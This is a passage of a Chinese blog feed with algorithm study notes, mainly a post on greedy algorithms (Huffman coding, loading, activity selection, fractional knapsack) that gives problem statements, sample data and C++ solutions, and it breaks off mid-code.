(i=1,2,...,T)。T=0表示输入结束，你的程序不应当处理这一行。</span><br><span class="line"></span><br><span class="line">输出</span><br><span class="line"></span><br><span class="line">对于每组数据，输出仅一行，即项目的IRR，四舍五入保留小数点后两位。如果IRR不存在，输出&quot;No&quot;，如果有多个不同IRR满足条件，输出&quot;Too many&quot;（均不含引号）</span><br><span class="line"></span><br><span class="line">样例输入</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line"></span><br><span class="line">-1 2</span><br><span class="line"></span><br><span class="line">2</span><br><span class="line"></span><br><span class="line">-8 6 9</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">样例输出</span><br><span class="line"></span><br><span class="line">1.00</span><br><span class="line"></span><br><span class="line">0.50</span><br></pre></td></tr></table></figure></p><p><strong>思路</strong><br>从无穷大到-1二分搜索答案</p><p><strong>code</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;iostream&gt;</span></span><br><span class="line"><span class="comment">#include &lt;iomanip&gt;</span></span><br><span class="line"><span class="comment">#include &lt;cmath&gt; </span></span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int t,i;</span><br><span class="line"><span class="keyword">while</span>(cin&gt;&gt;t&amp;&amp;t!=0)</span><br><span class="line">&#123;</span><br><span class="line">    double a[11];</span><br><span class="line">    <span class="keyword">for</span>(i=0;i&lt;=t;i++)</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">        double l,r,mid,x,ans;</span><br><span class="line">    ans=0.0;</span><br><span class="line">        l=-1.0;</span><br><span class="line">        r=1e6;</span><br><span class="line">        <span class="keyword">while</span>(fabs(a[0]+ans)&gt;1e-7)</span><br><span class="line">       &#123;</span><br><span class="line">    ans=0.0;</span><br><span class="line">    x=1.0;</span><br><span class="line">    mid=(l+r)/2;</span><br><span class="line">    <span class="keyword">for</span>(int j=1;j&lt;=t;j++)</span><br><span class="line">    &#123;</span><br><span class="line">    x=x/(1+mid);</span><br><span class="line">    ans+=a[j]*x;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span>((ans+a[0])&gt;0)</span><br><span class="line">l=mid;</span><br><span class="line"><span class="keyword">else</span> r=mid;</span><br><span class="line">       &#125;</span><br><span class="line">    cout&lt;&lt;fixed&lt;&lt;setprecision(2)&lt;&lt;mid&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">return</span> 0; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;&lt;strong&gt;前言&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;递归到天荒地老
    
    </summary>
    
      <category term="Study" scheme="https://gardenia30.top/categories/Study/"/>
    
    
      <category term="Algorithm" scheme="https://gardenia30.top/tags/Algorithm/"/>
    
  </entry>
  
  <entry>
    <title>贪心算法</title>
    <link href="https://gardenia30.top/2018/11/03/%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95/"/>
    <id>https://gardenia30.top/2018/11/03/贪心算法/</id>
    <published>2018-11-03T08:51:32.000Z</published>
    <updated>2018-12-22T11:31:01.444Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h1><p>贪心比较简单，但是要掌握好结构体排序的构造<a id="more"></a></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a><strong>正文</strong></h1><h2 id="1-哈夫曼编码"><a href="#1-哈夫曼编码" class="headerlink" title="1.哈夫曼编码"></a><strong>1.哈夫曼编码</strong></h2><p><strong>题目描述</strong><br>给定一只含有小写字母的字符串；输出其哈夫曼编码的长度。</p><p><strong>输入</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">第一行一个整数T，代表样例的个数，接下来T行，每行一个字符串，0&lt;T&lt;=2000,字符串长度0&lt;L&lt;=1500.</span><br><span class="line">3</span><br><span class="line">hrvsh</span><br><span class="line">lcxeasexdphiopd</span><br><span class="line">mntflolfbtbpplahqolqykrqdnwdoq</span><br></pre></td></tr></table></figure></p><p><strong>输出</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">10</span><br><span class="line">51</span><br><span class="line">115</span><br></pre></td></tr></table></figure></p><p><strong>思路</strong><br>要构造哈夫曼编码首先就必须要计算出每个字母出现的频率，扫描一遍即可;接下来就需要用这些频率来构造哈夫曼树，在这里需要使用优先队列这个数据结构，将频率全部push进入优先队列按从小到大排列后，使用贪心算法，每次都是将最小的两个频率拿出来构造哈夫曼树，两数的和再次push进队列，重复进行即可。</p><p><strong>code</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;iostream&gt;</span></span><br><span class="line"><span class="comment">#include&lt;queue&gt;</span></span><br><span class="line"><span class="comment">#include&lt;string.h&gt;</span></span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int t;</span><br><span class="line">cin&gt;&gt;t;</span><br><span class="line"><span class="keyword">while</span>(t--)</span><br><span class="line">&#123;</span><br><span class="line">char s[2000];</span><br><span class="line">cin&gt;&gt;s;</span><br><span class="line">int fre[26]=&#123;0&#125;;</span><br><span class="line">int len=strlen(s);</span><br><span class="line"><span class="keyword">for</span>(int i=0;i&lt;len;i++)</span><br><span class="line">&#123;</span><br><span class="line">fre[s[i]-<span class="string">'a'</span>]++;</span><br><span class="line">&#125;</span><br><span class="line">priority_queue&lt;int,vector&lt;int&gt;,greater&lt;int&gt; &gt;q;</span><br><span class="line"><span class="keyword">for</span>(int i=0;i&lt;26;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(fre[i]&gt;0)</span><br><span class="line">&#123;</span><br><span class="line">q.push(fre[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">int sum=0;</span><br><span class="line"><span class="keyword">while</span>(q.size()&gt;=2)</span><br><span class="line">&#123;</span><br><span class="line">int a=q.top();</span><br><span class="line">q.pop();</span><br><span class="line">int b=q.top();</span><br><span class="line">q.pop();</span><br><span class="line">sum+=(a+b);</span><br><span class="line">q.push(a+b);</span><br><span class="line">&#125;</span><br><span class="line">cout&lt;&lt;sum&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="2-最优装载"><a href="#2-最优装载" class="headerlink" title="2.最优装载"></a><strong>2.最优装载</strong></h2><p><strong>题目描述</strong><br>轮船载重有限将尽可能多的集装箱装上轮船<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Description</span><br><span class="line"></span><br><span class="line">有一批集装箱要装上一艘载重量为C的轮船。其中集装箱i的重量为wi。最优装载问题要求确定在装载体积不受限制的情况下，将尽可能多的集装箱装上轮船。</span><br><span class="line"></span><br><span class="line">Input</span><br><span class="line"></span><br><span class="line">输入的第一个为测试样例的个数T（ T &lt;= 100 ），接下来有T个测试样例。每个测试样例的第一行是一个整数n（ n &lt;= 1000 ）和一个非负数C（ C &lt;= 10000 ），分别表示集装箱的个数以及轮船的载重量。接下来有n行，每行一个非负数，表示每个集装箱的重量。</span><br><span class="line"></span><br><span class="line">Output</span><br><span class="line"></span><br><span class="line">输出最多装集装箱的个数和最终的承重量。</span><br><span class="line"></span><br><span class="line">Sample Input</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">5 100</span><br><span class="line">20</span><br><span class="line">50</span><br><span class="line">120</span><br><span class="line">99</span><br><span class="line">30</span><br></pre></td></tr></table></figure></p><p><strong>思路</strong><br>贪心选择策略：重量最轻者优先装载<br>将装船过程划为多步选择，每步装一个货箱，每次从剩下的货箱中选择重量最轻的货箱。如此下去直到所有货箱均装上船或船上不能再容纳其他任何一个货箱。</p><p><strong>code</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;iostream&gt;</span></span><br><span class="line"><span class="comment">#include&lt;algorithm&gt;</span></span><br><span class="line">using namespace std;</span><br><span class="line">int w[100];</span><br><span class="line">int c;</span><br><span class="line">int n;</span><br><span class="line">int load(int k,int z)</span><br><span class="line">&#123;</span><br><span class="line">int count=0;</span><br><span class="line">sort(w,w+k);</span><br><span class="line"><span class="keyword">for</span>(int i=0;i&lt;k;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(z&gt;=w[i])</span><br><span class="line">&#123;</span><br><span class="line">count+=w[i];</span><br><span class="line">z-=w[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int t;</span><br><span class="line">cin&gt;&gt;t;</span><br><span class="line"><span class="keyword">while</span>(t--)</span><br><span class="line">&#123;</span><br><span class="line">cin&gt;&gt;n&gt;&gt;c;</span><br><span class="line"><span class="keyword">for</span>(int i=0;i&lt;n;i++)</span><br><span class="line">&#123;</span><br><span class="line">cin&gt;&gt;w[i];</span><br><span class="line">&#125;</span><br><span class="line">int ans=load(n,c);</span><br><span class="line">cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">return</span> 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="3-配对元素"><a href="#3-配对元素" class="headerlink" title="3.配对元素"></a><strong>3.配对元素</strong></h2><p><strong>题目描述</strong><br>给出2个序列A={a[1]，a[2]，…，a[n]}，B={b[1]，b[2]，…，b[n]},从A、B中各选出n个元素进行一一配对（可以不按照原来在序列中的顺序）    ，并使得所有配对元素差的绝对值之和最大。 </p><p><strong>输入</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入的第1行为1个整数n 第2行包含n个整数，题目中的A序列。  第3行包含n个整数，题目中的B序列。</span><br><span class="line">4</span><br><span class="line">2 5 6 3</span><br><span class="line">1 4 6 7</span><br></pre></td></tr></table></figure></p><p><strong>输出</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> 一个数，最大配对</span><br><span class="line">3与6配对，2与7配对，5与4配对，6与1配对，绝对值之差和为14 对于10%的数据，有n≤20；  对于30%的数据，有n≤100；  对于50%的数据，有n≤1000；  对于100%的数据，有n≤10000；a[i]，b[i]≤1000</span><br><span class="line">14</span><br></pre></td></tr></table></figure></p><p><strong>思路</strong><br>要使相减的绝对值之和最大，也就是要尽量使得两个数的差要大一点，贪心策略自然就是用a序列最大值减去b序列最小值。</p><h3 id="code"><a href="#code" class="headerlink" title="code"></a><strong>code</strong></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;iostream&gt;</span></span><br><span class="line"><span class="comment">#include&lt;cmath&gt;</span></span><br><span class="line"><span class="comment">#include&lt;algorithm&gt;</span></span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int n;</span><br><span class="line">cin&gt;&gt;n;</span><br><span class="line">int a[100];</span><br><span class="line">int b[100];</span><br><span class="line"><span class="keyword">for</span>(int i=0;i&lt;n;i++)</span><br><span class="line">&#123;</span><br><span class="line">cin&gt;&gt;a[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(int i=0;i&lt;n;i++)</span><br><span class="line">&#123;</span><br><span class="line">cin&gt;&gt;b[i];</span><br><span class="line">&#125;</span><br><span class="line">sort(a,a+n);</span><br><span class="line">sort(b,b+n);</span><br><span class="line">int j=0,sum=0;</span><br><span class="line"><span class="keyword">for</span>(int i=n-1;i&gt;=0;i--)</span><br><span class="line">&#123;</span><br><span class="line">sum+=fabs(a[i]-b[j]);</span><br><span class="line">j++;</span><br><span class="line">&#125;</span><br><span class="line">cout&lt;&lt;sum&lt;&lt;endl;</span><br><span class="line"><span class="built_in">return</span> 0;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h2 id="4-活动安排"><a href="#4-活动安排" class="headerlink" title="4.活动安排"></a><strong>4.活动安排</strong></h2><p><strong>题目描述</strong><br>给出n个活动的开始和结束时间，要求找出所有活动集合中不冲突的最大活动数</p><p><strong>思路</strong><br>结构体，按结束时间从小到大排序这就是贪心策略：越早结束约优先考虑，第一个默认加入，其后进行判断到底是否可以加入集合，如可以就计数</p><p><strong>code</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;iostream&gt;</span></span><br><span class="line"><span class="comment">#include&lt;algorithm&gt;</span></span><br><span class="line">using namespace std;</span><br><span class="line">typedef struct node</span><br><span class="line">&#123;</span><br><span class="line">int begin;</span><br><span class="line">int end;</span><br><span class="line">&#125;node;</span><br><span class="line">bool cmp(node a,node b)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">return</span> a.end&lt;b.end;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int n;</span><br><span class="line"><span class="keyword">while</span>(cin&gt;&gt;n)</span><br><span class="line">&#123;</span><br><span class="line">node work[100000];</span><br><span class="line"><span class="keyword">for</span>(int i=0;i&lt;n;i++)</span><br><span class="line">&#123;</span><br><span class="line">cin&gt;&gt;work[i].begin&gt;&gt;work[i].end;</span><br><span class="line">&#125;</span><br><span class="line">sort(work,work+n,cmp);</span><br><span class="line">int count=1;</span><br><span class="line">int temp=work[0].end;</span><br><span class="line"><span class="keyword">for</span>(int i=1;i&lt;n;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(work[i].begin&gt;=temp)</span><br><span class="line">&#123;</span><br><span class="line">count++;</span><br><span class="line">temp=work[i].end;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">cout&lt;&lt;count&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="5-区间包含"><a href="#5-区间包含" class="headerlink" title="5.区间包含"></a><strong>5.区间包含</strong></h2><p><strong>题目描述</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">已知 n 个左闭右开区间 [a,b)，对其进行 m 次询问，求区间[l,r]最多可以包含 n 个区间中的多少个区间，并且被包含的所有区间都不相交。</span><br><span class="line">输入</span><br><span class="line"></span><br><span class="line">输入包含多组测试数据，对于每组测试数据：</span><br><span class="line">第一行包含两个整数 n ,m (1≤n≤100000,1≤m≤100) </span><br><span class="line">接下来 n 行每行包含两个整数 a ,b (0≤a&lt;b≤10^9) </span><br><span class="line">接下来 m 行每行包含两个整数 l ,r (0≤l&lt;r≤10^9) </span><br><span class="line"></span><br><span class="line">输出</span><br><span class="line">对于每组测试数据，输出 m 行，每行包含一个整数</span><br><span class="line"></span><br><span class="line">样例输入</span><br><span class="line">4 3</span><br><span class="line">1 3</span><br><span class="line">2 4</span><br><span class="line">1 4</span><br><span class="line">1 2</span><br><span class="line">1 2</span><br><span class="line">1 3</span><br><span class="line">1 4</span><br><span class="line"></span><br><span class="line">样例输出</span><br><span class="line">1</span><br><span class="line">1</span><br><span class="line">2</span><br></pre></td></tr></table></figure></p><p><strong>思路</strong><br>和活动安排问题大致相同</p><p><strong>code</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;iostream&gt;</span></span><br><span class="line"><span class="comment">#include&lt;algorithm&gt;</span></span><br><span class="line">using namespace std;</span><br><span class="line">typedef struct node</span><br><span class="line">&#123;</span><br><span class="line">int left;</span><br><span class="line">int right;</span><br><span class="line">&#125;node; </span><br><span class="line">bool cmp(node a,node b)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">return</span>  a.right&lt;b.right;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">int n,m;</span><br><span class="line"><span class="keyword">while</span>(cin&gt;&gt;n&gt;&gt;m)</span><br><span class="line">&#123;</span><br><span class="line">node nnum[100005],mnum[105];</span><br><span class="line"><span class="keyword">for</span>(int i=0;i&lt;n;i++)</span><br><span class="line">&#123;</span><br><span class="line">cin&gt;&gt;nnum[i].left&gt;&gt;nnum[i].right;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(int i=0;i&lt;m;i++)</span><br><span class="line">&#123;</span><br><span class="line">cin&gt;&gt;mnum[i].left&gt;&gt;mnum[i].right;</span><br><span class="line">&#125;</span><br><span class="line">sort(nnum,nnum+n,cmp);</span><br><span class="line"><span class="keyword">for</span>(int i=0;i&lt;m;i++)</span><br><span class="line">&#123;</span><br><span class="line">int count=0;</span><br><span class="line">int t=mnum[i].left;</span><br><span class="line"><span class="keyword">for</span>(int j=0;j&lt;n;j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(nnum[j].left&gt;=t)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(nnum[j].right&lt;=mnum[i].right)</span><br><span class="line">&#123;</span><br><span class="line">count++;</span><br><span class="line">t=nnum[j].right;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">cout&lt;&lt;count&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="6-homework"><a href="#6-homework" class="headerlink" title="6.homework"></a><strong>6.homework</strong></h2><p><strong>题目描述</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> 临近开学了，大家都忙着收拾行李准  备返校，但 I_Love_C 却不为此担心! 因为他的心思全在暑假作业上：目前为止还未开动。</span><br><span class="line"></span><br><span class="line">暑假作业是很多张试卷，我们这些从试卷里爬出来的人都知道，卷子上的题目有选择题、填空题、简答题、证明题等。而做选择题的好处就在于工作量很少，但又因为选择题题目都普遍很长。如果有 5 张试卷，其中 4 张是选择题，最后一张是填空题，很明显做最后一张所花的时间要比前 4 张长很多。但如果你只做了选择题，虽然工作量很少，但表面上看起来也已经做了4/5的作业了。</span><br><span class="line"></span><br><span class="line">I_Love_C决定就用这样的方法来蒙混过关，他统计出了做完每一张试卷所需的时间以及它做完后能得到的价值（按上面的原理，选择题越多价值当然就越高咯）。</span><br><span class="line"></span><br><span class="line">现在就请你帮他安排一下，用他仅剩的一点时间来做最有价值的作业。</span><br><span class="line">输入</span><br><span class="line"></span><br><span class="line">测试数据包括多组。每组测试数据以两个整数 M,N(1&lt;M&lt;20,1&lt;N&lt;10000) 开头，分别表示试卷的数目和 I_Love_C 剩下的时间。接下来有 M 行，每行包括两个整数 T,V(1&lt;T&lt;N,1&lt;V&lt;10000)分别表示做完这张试卷所需的时间以及做完后能得到的价值，输入以 0 0 结束。</span><br><span class="line">输出</span><br><span class="line"></span><br><span class="line">对应每组测试数据输出 I_Love_C 能获得的最大价值。保留小数点 2 位</span><br><span class="line"></span><br><span class="line">提示：float 的精度可能不够，你应该使用 double 类型。</span><br><span class="line">样例输入</span><br><span class="line"></span><br><span class="line">4 20</span><br><span class="line">4 10</span><br><span class="line">5 22</span><br><span class="line">10 3</span><br><span class="line">1 2</span><br><span class="line">0 0</span><br><span class="line"></span><br><span class="line">样例输出</span><br><span class="line"></span><br><span class="line">37.00</span><br></pre></td></tr></table></figure></p><p><strong>思路</strong><br>该题为贪心法解决背包问题，物体可以被拆分，先按照平均价值排序即可</p><p><strong>code</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;iostream&gt;</span></span><br><span class="line"><span class="comment">#include&lt;algorithm&gt;</span></span><br><span class="line"><span class="comment">#include&lt;iomanip&gt;</span></span><br><span class="line">using namespace std;</span><br><span class="line">typedef struct node</span><br><span class="line">&#123;</span><br><span class="line">double time;</span><br><span class="line">double value;</span><br><span class="line">double avg;</span><br><span class="line">&#125;node;</span><br><span class="line">bool cmp(node a,node b)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">return</span> a.avg&gt;b.avg;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int m,n;</span><br><span class="line"><span class="keyword">while</span>(cin&gt;&gt;m&gt;&gt;n&amp;&amp;(m!=0&amp;&amp;n!=0))</span><br><span class="line">&#123;</span><br><span class="line">node paper[100];</span><br><span class="line"><span class="keyword">for</span>(int i=0;i&lt;m;i++)</span><br><span class="line">&#123;</span><br><span 